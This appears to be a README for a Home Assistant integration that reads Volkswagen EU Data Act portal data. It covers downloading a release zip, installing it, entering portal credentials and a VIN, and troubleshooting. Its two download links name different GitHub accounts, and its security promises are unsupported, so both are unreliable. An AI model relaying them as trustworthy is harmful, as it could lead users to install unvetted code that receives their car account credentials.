# 🚗 hass-vw-eu-data-act - Connect your Volkswagen car to Home Assistant

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/russellunhamended94/hass-vw-eu-data-act/releases)

This integration brings data from your Volkswagen EU Data Act portal directly into Home Assistant. You can monitor your vehicle status, battery levels, and trip data from your dashboard.

## 📥 How to download the software

Follow these steps to get the files you need for your setup.

1. Go to the [Releases page](https://github.com/russellunhampered94/hass-vw-eu-data-act/releases).
2. Look for the section titled "Assets" under the most recent version.
3. Click the file with the zip extension to start your download.
4. Save this file to a folder you can find later on your Windows computer, such as your Downloads folder.

## 🛠️ Requirements for your system

To use this integration, your setup needs a few things. Please verify you have these items ready.

* A running installation of Home Assistant.
* A registered account on the Volkswagen EU Data Act portal.
* Your Volkswagen vehicle identification number (VIN).
* A network connection between your Windows computer and your Home Assistant server.
* The File Editor or Studio Code Server add-on installed inside Home Assistant to manage your files.

## ⚙️ Installation steps

Follow this sequence to move the files into Home Assistant.

1. Locate the zip file you downloaded in the previous section.
2. Right-click the file and select "Extract All" to see the folder contents. You will see a folder named after the integration.
3. Open your Home Assistant dashboard in your web browser.
4. Open the File Editor or Studio Code Server add-on.
5. Locate your `config` folder.
6. Open the `custom_components` folder. If this folder does not exist, create it inside the `config` folder.
7. Upload the extracted folder from your computer into this `custom_components` folder.
8. Restart Home Assistant to load the new software. You can do this by going to Developer Tools, selecting YAML, and clicking "Restart".

## 🔑 Setting up the integration

Once the system restarts, you must configure the connection to your car.

1. Navigate to Settings, then Devices & Services in your Home Assistant menu.
2. Click the "Add Integration" button in the bottom right corner.
3. Search for "VW EU Data Act" in the search box.
4. Click the name of the integration to open the setup window.
5. Enter the email address and password you use for the Volkswagen EU Data Act portal.
6. Enter your Vehicle Identification Number (VIN) when requested.
7. Click Submit. Home Assistant will now retrieve your vehicle data.

## 📊 Viewing your vehicle data

After a successful setup, Home Assistant creates new entities for your car. These represent the different data points available from your vehicle. Common entities include:

* Battery range and charging status.
* Current odometer reading.
* Tire pressure status.
* Climate control switches.
* Door lock status.

You can add these items to your Lovelace dashboard. Click "Edit Dashboard" on your main screen and add a new card. Select the entities that start with "vw_data" to see your car status in real time.

## 💡 Managing updates

Updates happen when new features arrive or when Volkswagen changes their portal data. Check the GitHub page occasionally to see if a newer version exists.

1. Compare your current version number with the one listed on the releases page.
2. If a new version exists, download the new zip file.
3. Extract the files as you did in the installation step.
4. Overwrite the files in your `custom_components` folder with the new versions.
5. Restart Home Assistant to apply the changes.

## 🧱 Troubleshooting common issues

If you encounter errors during setup, review this list for common solutions.

### Authentication errors
Verify your email and password. These must be the same credentials you use on the official Volkswagen website. Sometimes, special characters in passwords cause issues. Try a password that uses only letters and numbers if the integration fails to connect.

### Missing entities
If no sensors appear after setup, wait five minutes. The data requires time to sync from the Volkswagen portal to your home network. If the sensors do not appear, restart your Home Assistant instance one more time.

### Connection timeouts
This happens if your network blocks the connection to the Volkswagen servers. Check your router firewall settings. Ensure that your Home Assistant device has permission to reach external websites.

### Invalid VIN
Check your vehicle registration document or your car dashboard. The VIN must match exactly. Ensure you included all seventeen characters. Do not include spaces or extra punctuation.

## 📡 Privacy and data security

This integration acts as a bridge between your local home network and the Volkswagen portal. Your login credentials stay within your Home Assistant configuration folder. The software stores these securely. It communicates only with official Volkswagen servers. No third-party services collect your car data through this tool. Ensure that you keep your Home Assistant instance updated to maintain the highest level of security for your local network.